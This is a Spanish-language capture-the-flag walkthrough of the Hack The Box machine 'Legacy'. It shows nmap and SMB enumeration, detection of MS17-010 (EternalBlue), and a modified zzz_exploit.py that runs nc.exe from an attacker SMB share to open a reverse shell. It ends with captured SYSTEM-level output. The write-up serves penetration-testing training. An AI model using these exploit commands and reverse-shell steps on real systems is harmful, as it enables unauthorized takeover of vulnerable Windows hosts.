---
cover: ../../../.gitbook/assets/Legacy.png
coverY: 0
---

# Legacy

## Reconocimiento

Primero vamos a probar si tenemos conexión con la maquina a través de el protocolo **ICMP**

```shell
> ping -c 1 10.10.10.4
PING 10.10.10.4 (10.10.10.4) 56(84) bytes of data.
64 bytes from 10.10.10.4: icmp_seq=1 ttl=127 time=59.9 ms

--- 10.10.10.4 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 59.943/59.943/59.943/0.000 ms
```

Escaneamos todo el rango de puertos abiertos de la maquina

```shell
> nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.4

PORT    STATE SERVICE      REASON
135/tcp open  msrpc        syn-ack ttl 127
139/tcp open  netbios-ssn  syn-ack ttl 127
445/tcp open  microsoft-ds syn-ack ttl 127
```

Con los puertos abiertos vamos a escanear las versiones y lanzar scripts básicos de reconocimiento

```shell
> nmap -sCV -p135,139,445 10.10.10.4

PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 5d00h27m38s, deviation: 2h07m15s, median: 4d22h57m39s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:2d:42 (VMware)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

### Puerto 445 (smb)

```shell
> crackmapexec smb 10.10.10.4
SMB         10.10.10.4      445    LEGACY           [*] Windows 5.1 (name:LEGACY) (domain:legacy) (signing:False) (SMBv1:True)
> crackmapexec smb 10.10.10.4 --shares
SMB         10.10.10.4      445    LEGACY           [*] Windows 5.1 (name:LEGACY) (domain:legacy) (signing:False) (SMBv1:True)
SMB         10.10.10.4      445    LEGACY           [-] Error enumerating shares: SMB SessionError: 0x5b
> smbclient -L 10.10.10.4 -N
session setup failed: NT_STATUS_INVALID_PARAMETER
```

Cuando intentamos enumerar no encontramos nada o falla, pero vemos que es un Windows XP y los windows ya algo antiguos suelen ser vulnerables al **eternalblue**

Vamos a buscar con **nmap** si es vulnerable al **eternalblue**

```shell
> locate .nse | xargs grep "categories" | grep -oP '".*?"' | sort -u # Filtrar categorias de los scripts
"auth"
"broadcast"
"brute"
"default"
"discovery"
"dos"
"exploit"
"external"
"fuzzer"
"intrusive"
"malware"
"safe"
"version"
"vuln"
```

Y lanzamos el conjunto de **vuln** y **safe** para el puerto **smb** para ver si es **vulnerable** al eternal blue

```shell
> nmap --script "vuln and safe" -p445 10.10.10.4

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
```

Buscamos el **ms17-010** en google y nos clonamos el repo de github y con checker.py mirara si tiene algún named pipe en estado **OK**

```shell
> git clone https://github.com/worawit/MS17-010
> cd MS17-010
> python2 checker.py 10.10.10.4
Target OS: Windows 5.1
The target is not patched

=== Testing named pipes ===
spoolss: Ok (32 bit)
samr: STATUS_ACCESS_DENIED
netlogon: STATUS_ACCESS_DENIED
lsarpc: STATUS_ACCESS_DENIED
browser: Ok (32 bit)
```

Pues tenemos ejecución remota de comandos ahora lo que haremos es en otra ventana estar en escucha con netcat y compartir un recurso compartido por smb

```shell
> rlwrap nc -lvnp <puerto>
```

```shell
> smbserver.py smbFolder $(pwd) # Donde este el nc.exe
```

En el exploit **zzz\_exploit.py** cambiaremos la siguiente linea para poder a través de el recurso compartido ejecutar **nc.exe** en la máquina victima para poder enviar una reverse shell

```python
def smb_pwn(conn, arch):
    #smbConn = conn.get_smbconnection()
    #print('creating file c:\\pwned.txt on the target')
    #tid2 = smbConn.connectTree('C$')
    #fid2 = smbConn.createFile(tid2, '/pwned.txt')
    #smbConn.closeFile(tid2, fid2)
    #smbConn.disconnectTree(tid2)
    #smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
    service_exec(conn, r'cmd /c \\<tu-ip>\smbFolder\nc.exe -e cmd <tu-ip> <tu-puerto>')
    # Note: there are many methods to get shell over SMB admin session
    # a simple method to get shell (but easily to be detected by AV) is
    # executing binary generated by "msfvenom -f exe-service ..."
```

Con todo esto echo pasemos a ejecutar el **zzz\_exploit.py**

```shell
> python2 zzz_exploit.py
zzz_exploit.py <ip> [pipe_name]
> python2 zzz_exploit.py 10.10.10.4 spoolss
Target OS: Windows 5.1
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x86135da8
SESSION: 0xe10a0390
FLINK: 0x7bd48
InData: 0x7ae28
MID: 0xa
TRANS1: 0x78b50
TRANS2: 0x7ac90
modify transaction struct for arbitrary read/write
make this SMB session to be SYSTEM
current TOKEN addr: 0xe1071148
userAndGroupCount: 0x3
userAndGroupsAddr: 0xe10711e8
overwriting token UserAndGroups
Opening SVCManager on 10.10.10.4.....
Creating service VSez.....
Starting service VSez.....
The NETBIOS connection with the remote host timed out.
Removing service VSez.....
ServiceExec Error on: 10.10.10.4
nca_s_proto_error
Done
```

Y recibimos la **reverse shell** con el usuario **administrador**

<pre class="language-shell"><code class="lang-shell"><strong>> rlwrap nc -lvnp 4444
</strong>listening on [any] 4444 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.4] 1048
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

\> whoami
nt authority\system
</code></pre>
